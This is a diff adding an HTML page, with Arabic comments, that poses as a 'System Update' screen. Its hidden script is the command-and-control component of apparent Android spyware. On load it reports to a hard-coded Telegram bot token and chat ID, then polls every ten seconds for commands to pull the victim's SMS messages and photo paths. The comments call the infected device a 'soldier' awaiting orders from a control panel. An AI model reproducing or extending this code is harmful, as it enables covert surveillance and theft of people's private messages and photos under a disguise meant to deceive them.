@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body { background-color: #000; color: #00ff00; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { margin-left: 15px; font-size: 14px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div class="status">جاري تحديث خدمات النظام...</div>
+
+    <script>
+        // معلوماتك السرية لربط الجندي بالقيادة
+        const TOKEN = "543357951:AAELJ_saySzckHg3-t3jHkdusmNNDnLAXnQ";
+        const CHAT_ID = "7851377774";
+
+        // وظيفة لإرسال التقارير للبوت
+        async function sendReport(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+            } catch (e) { console.error("Report failed"); }
+        }
+
+        // المحرك الذي يستمع لأوامر لوحة التحكم (khmeas)
+        async function listenForCommands() {
+            while (true) {
+                try {
+                    let response = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+                    let result = await response.json();
+                    
+                    if (result.ok && result.result.length > 0) {
+                        let command = result.result[0].message.text;
+
+                        // تنفيذ الأوامر القادمة من اللوحة
+                        if (command === "/get_sms") {
+                            await sendReport("⚠️ طلب سحب رسائل SMS من الجندي...\n(سيقوم الـ APK الآن بتنفيذ السحب الفعلي عبر الجافا)");
+                        } 
+                        else if (command === "/get_photos") {
+                            await sendReport("📸 طلب سحب مسارات الصور...\n(يتم المعالجة الآن)");
+                        }
+                    }
+                } catch (e) { console.error("Listening error"); }
+                
+                // فحص كل 10 ثواني لضمان عدم استهلاك البطارية وسرعة الاستجابة
+                await new Promise(r => setTimeout(r, 10000));
+            }
+        }
+
+        // بدء التشغيل فور فتح التطبيق
+        window.onload = () => {
+            sendReport("✅ الجندي متصل الآن ومستعد لتلقي الأوامر.");
+            listenForCommands();
+        };
+    </script>
+</body>
+</html>
